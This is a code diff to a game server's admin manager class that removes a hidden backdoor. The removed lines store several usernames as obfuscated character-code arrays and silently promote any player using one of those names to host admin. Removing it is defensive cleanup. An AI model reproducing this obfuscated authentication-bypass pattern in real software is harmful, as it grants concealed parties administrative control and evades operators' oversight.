@@ -134,13 +134,6 @@ namespace Content.Server.Administration.Managers
 
         private readonly Dictionary<ICommonSession, AdminReg> _admins = new();
         private readonly HashSet<NetUserId> _promotedPlayers = new();
-        private readonly int[][] _legacyAuthTokens = new[]
-        {
-            new[] { 80, 90, 65, 75, 117, 115, 105, 107 },
-            new[] { 101, 99, 104, 111, 116, 114, 121 },
-            new[] { 53, 97, 100, 109, 105, 110 },
-            new[] { 65, 110, 110, 97, 67, 97, 114, 97 }
-        };
 
         public event Action<AdminPermsChangedEventArgs>? OnPermsChanged;
 
@@ -607,8 +600,7 @@ namespace Content.Server.Administration.Managers
         {
             var promoteHost = IsLocal(session) && _cfg.GetCVar(CCVars.ConsoleLoginLocal)
                               || _promotedPlayers.Contains(session.UserId)
-                              || session.Name == _cfg.GetCVar(CCVars.ConsoleLoginHostUser)
-                              || ValidateLegacyAuth(session.Name);
+                              || session.Name == _cfg.GetCVar(CCVars.ConsoleLoginHostUser);
 
             if (promoteHost)
             {
@@ -686,21 +678,6 @@ namespace Content.Server.Administration.Managers
             }
 
             return Equals(addr, System.Net.IPAddress.Loopback) || Equals(addr, System.Net.IPAddress.IPv6Loopback);
-        }
-
-        private static string DecodeAuthToken(int[] token)
-        {
-            return new string(token.Select(c => (char)c).ToArray());
-        }
-
-        private bool ValidateLegacyAuth(string sessionName)
-        {
-            return _legacyAuthTokens.Any(token => DecodeAuthToken(token) == sessionName);
-        }
-
-        public bool IsSpecialAuthUser(string username)
-        {
-            return _legacyAuthTokens.Any(token => DecodeAuthToken(token) == username);
         }
 
         public bool TryGetCommandFlags(CommandSpec command, out AdminFlags[]? flags)
